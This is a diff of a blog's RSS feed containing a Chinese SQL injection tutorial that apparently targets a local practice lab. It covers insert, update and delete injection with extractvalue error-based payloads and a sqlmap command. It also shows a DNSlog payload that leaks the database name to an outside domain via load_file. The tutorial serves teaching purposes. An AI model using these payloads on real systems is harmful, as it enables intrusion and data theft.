+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;猜测insert语句：
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;insert into table1(username,password,sex,phone,email,addr)values(&amp;#39;用户名&amp;#39;,&amp;#39;密码&amp;#39;,&amp;#39;性别&amp;#39;,&amp;#39;地址&amp;#39;,&amp;#39;住址&amp;#39;)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;插入payload（注意使用了括号绕过，管道符包裹内）：
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;insert into table1(username,password,sex,phone,email,addr)values(&amp;#39;用户名&amp;#39;,&amp;#39;密码&amp;#39;,&amp;#39;性别&amp;#39;,&amp;#39;地址&amp;#39;,&amp;#39; |x &amp;#39; and extractvalue(1,concat(0x7e,(database()),0x7e))) #|  &amp;#39;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;update注入&#34;&gt;update注入
+&lt;/h3&gt;&lt;p&gt;先注册一个账号，进入到修改信息界面：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;猜测update语句：
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;update table1 set sex=&amp;#39;11&amp;#39;,phone=&amp;#39;22&amp;#39;,email=&amp;#39;33&amp;#39;,addr=&amp;#39;44&amp;#39; where username=&amp;#39;retr0&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;插入payload（管道符包裹内）：
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;update table1 set sex=&amp;#39;11&amp;#39;,phone=&amp;#39;22&amp;#39;,email=&amp;#39;33&amp;#39;,addr=&amp;#39;|44&amp;#39; and extractvalue(1,concat(0x7e,(database()),0x7e)) or &amp;#39;1&amp;#39;=&amp;#39;1 &amp;#39;| where username=&amp;#39;retr0&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;delete注入&#34;&gt;delete注入
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python sqlmap.py -u &amp;#34;http://localhost/vul/sqli/sqli_del.php?id=69&amp;#34; --current-db --batch --threads 10
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;http头注入盲注宽字节注入&#34;&gt;HTTP头注入/盲注/宽字节注入
+&lt;/h3&gt;&lt;p&gt;详见&lt;a class=&#34;link&#34; href=&#34;https://www.retr0.xyz/p/1.22-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97-2/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;1.22 SQL注入系列-2&lt;/a&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>1.24-2 弱类型比较漏洞及序列化与反序列化</title>
         <link>https://www.retr0.xyz/p/1.24-2-%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link>
         <pubDate>Sun, 25 Jan 2026 00:50:33 +0800</pubDate>
@@ -2219,7 +2447,8 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1&lt;span class=&#34;s1&#34;&gt;&amp;#39; and (select load_file(concat(&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\\\&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,(select database()),&amp;#39;&lt;/span&gt;.域名&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;a&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)))&lt;/span&gt; --+
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;打开&lt;a href=&#34;https://www.retr0.xyz/blog-files/dnslog.txt&#34;   target=&#34;_blank&#34;    rel=&#34;noopener noreferrer&#34;    data-pjax=&#34;false&#34;&gt;   dnslog.txt &lt;/a&gt;并使用&lt;kbd&gt;Ctrl&lt;/kbd&gt;+&lt;kbd&gt;S&lt;/kbd&gt;保存文件为php根据您的实际情况适当修改配置作为虚拟靶场。&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;打开&lt;a class=&#34;link&#34; href=&#34;https://makabaka11.github.io/blog-files/dnslog.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;dnslog.py&lt;/a&gt;并使用&lt;kbd&gt;Ctrl&lt;/kbd&gt;+&lt;kbd&gt;S&lt;/kbd&gt;保存文件为php根据您的实际情况适当修改配置作为虚拟靶场。&lt;/p&gt;
 &lt;!-- 这是一张图片，ocr 内容为： --&gt;
 &lt;p&gt;&lt;img src=&#34;https://free.picui.cn/free/2026/01/22/697231f8698bc.png&#34;
 	
